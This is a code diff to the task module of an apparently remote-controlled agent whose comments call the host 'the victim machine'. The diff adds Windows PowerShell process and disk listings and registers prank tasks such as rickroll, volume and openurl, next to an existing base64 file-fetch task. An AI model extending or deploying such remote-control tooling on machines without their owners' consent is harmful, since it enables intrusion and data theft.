@@ -11,6 +11,7 @@ import path from 'node:path';
 import crypto from 'node:crypto';
 import { execFileSync } from 'node:child_process';
 import { TASK_OPS } from '../common/protocol.js';
+import { runFunTask } from './fun.js';
 
 export const DEFAULT_MAX_FILE_BYTES = 32 * 1024;
 export const HASH_MAX_BYTES = 64 * 1024 * 1024; // hashing does not transfer bytes
@@ -21,6 +22,23 @@ export const FIND_MAX_DEPTH = 6;
 
 // Env vars whose names look secret never leave the victim machine.
 const SECRET_KEY_RE = /token|secret|passw|key|cred|auth/i;
+const WINDOWS_PS_SCRIPT = `
+$total=[double](Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory;
+'    PID    PPID  %CPU  %MEM COMMAND';
+Get-CimInstance Win32_Process |
+  Sort-Object WorkingSetSize -Descending |
+  Select-Object -First 40 |
+  ForEach-Object {
+    $mem=if ($total -gt 0) { 100 * [double]$_.WorkingSetSize / $total } else { 0 };
+    '{0,7} {1,7} {2,5} {3,5:N1} {4}' -f $_.ProcessId,$_.ParentProcessId,'?',$mem,$_.Name;
+  }`;
+const WINDOWS_DF_SCRIPT = `
+'Filesystem Size Used Avail Use% Mounted';
+Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ForEach-Object {
+  $size=[double]$_.Size; $free=[double]$_.FreeSpace; $used=$size-$free;
+  $pct=if ($size -gt 0) { [Math]::Round(100*$used/$size) } else { 0 };
+  '{0} {1:N0} {2:N0} {3:N0} {4}% {0}' -f $_.DeviceID,$size,$used,$free,$pct;
+}`;
 
 function positiveLimit(value, fallback) {
   const n = Number(value);
@@ -122,10 +140,16 @@ const TASKS = {
     return lines.join('\n') || '(no interfaces)';
   },
 
-  /** Top processes by memory, parsed from `ps` (unix only). */
-  ps() {
-    if (process.platform === 'win32') throw new Error('ps is not supported on win32');
-    const out = execFileSync('ps', ['-eo', 'pid,ppid,pcpu,pmem,comm'], {
+  /** Top processes by memory. */
+  ps(_args = {}, options = {}) {
+    const platform = options.platform ?? process.platform;
+    const exec = options.execFileSync ?? execFileSync;
+    if (platform === 'win32') {
+      return exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_PS_SCRIPT], {
+        encoding: 'utf8', timeout: 10_000, windowsHide: true,
+      }).trim();
+    }
+    const out = exec('ps', ['-eo', 'pid,ppid,pcpu,pmem,comm'], {
       encoding: 'utf8',
       timeout: 5000,
     });
@@ -144,10 +168,16 @@ const TASKS = {
     return `${header}\n${lines.join('\n')}`;
   },
 
-  /** Filesystem usage from `df -h` (unix only). */
-  df() {
-    if (process.platform === 'win32') throw new Error('df is not supported on win32');
-    return execFileSync('df', ['-h'], { encoding: 'utf8', timeout: 5000 }).trim();
+  /** Filesystem usage. */
+  df(_args = {}, options = {}) {
+    const platform = options.platform ?? process.platform;
+    const exec = options.execFileSync ?? execFileSync;
+    if (platform === 'win32') {
+      return exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_DF_SCRIPT], {
+        encoding: 'utf8', timeout: 10_000, windowsHide: true,
+      }).trim();
+    }
+    return exec('df', ['-h'], { encoding: 'utf8', timeout: 5000 }).trim();
   },
 
   /** Change the agent's working directory; later relative paths follow it. */
@@ -268,6 +298,15 @@ const TASKS = {
       file: { name: path.basename(file), size: st.size, dataB64: data.toString('base64') },
     };
   },
+
+  openurl: (args, options) => runFunTask('openurl', args, options),
+  say: (args, options) => runFunTask('say', args, options),
+  notify: (args, options) => runFunTask('notify', args, options),
+  beep: (args, options) => runFunTask('beep', args, options),
+  bounce: (args, options) => runFunTask('bounce', args, options),
+  volume: (args, options) => runFunTask('volume', args, options),
+  rickroll: (args, options) => runFunTask('rickroll', args, options),
+  party: (args, options) => runFunTask('party', args, options),
 };
 
 export const ALLOWED_OPS = Object.freeze([...TASK_OPS]);
